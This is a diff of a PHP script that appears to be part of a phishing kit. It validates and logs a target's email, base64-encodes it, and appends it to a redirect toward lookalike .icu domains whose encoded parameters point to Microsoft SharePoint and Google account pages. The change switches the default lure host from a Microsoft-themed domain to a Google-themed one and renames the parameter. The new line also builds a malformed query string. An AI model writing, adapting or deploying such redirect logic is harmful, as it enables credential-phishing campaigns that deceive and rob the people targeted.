@@ -8,7 +8,7 @@ $LOG_PATH  = __DIR__ . '/.data/validated.log';
 
 // ---- Redirect base + allow-list host(s)
 $REDIRECT_BASE = getenv('REDIRECT_BASE')
-  ?: 'https://login.casitawea.icu/?oleOXZQmi1LY=aHR0cHM6Ly9taWNyb3NvZnQuc2hhcmVwb2ludC5jb20vOng6L3IvdGVhbXMvKipURUFN';
+  ?: 'https://accounts.desva.icu?l6ngHIc=aHR0cHM6Ly9hY2NvdW50cy5nb29nbGUuY29t';
 
 $baseHost = parse_url($REDIRECT_BASE, PHP_URL_HOST) ?: '';
 $allowedEnv = trim((string) getenv('ALLOWED_REDIRECT_HOSTS'));
@@ -215,7 +215,7 @@ if (!$rbHost || (!empty($ALLOWED_REDIRECT_HOSTS) && !in_array($rbHost, $ALLOWED_
 
 // URL-safe base64 email for query param
 $omn = rtrim(strtr(base64_encode($email), '+/', '-_'), '=');
-$redirect = $REDIRECT_BASE . (str_contains($REDIRECT_BASE, '?') ? '&' : '?') . 'omn=' . $omn;
+$redirect = $REDIRECT_BASE . (str_contains($REDIRECT_BASE, '?') ? '&' : '?') . '&smn=' . $omn;
 
 // ---- OK
 respond(200, ['valid'=>true,'message'=>$MSG['ok'],'redirect'=>$redirect]);
